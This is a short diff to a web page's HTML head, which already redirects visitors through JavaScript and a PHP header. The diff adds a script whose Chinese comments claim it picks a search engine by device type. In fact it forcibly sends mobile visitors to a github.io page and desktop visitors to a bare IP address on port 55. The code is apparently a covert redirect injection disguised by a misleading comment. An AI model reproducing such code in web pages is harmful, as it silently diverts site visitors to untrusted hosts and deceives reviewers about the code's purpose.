@@ -14,6 +14,16 @@ document.location="http://alin489.github.io/zy";
 <?php
 header("location:http://alin489.github.io/zy");
 ?>
+  <script>
+      // 检测设备类型
+      var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      // 根据设备类型打开不同的搜索引擎
+      if (isMobile) {
+        window.location.href = "https://alin489.github.io/zy";
+      } else {
+        window.location.href = "http://211.149.232.25:55/zy";
+      }
+    </script>
 
   </head>
   <body> <!-- 主体元素，包含了网页的内容 -->
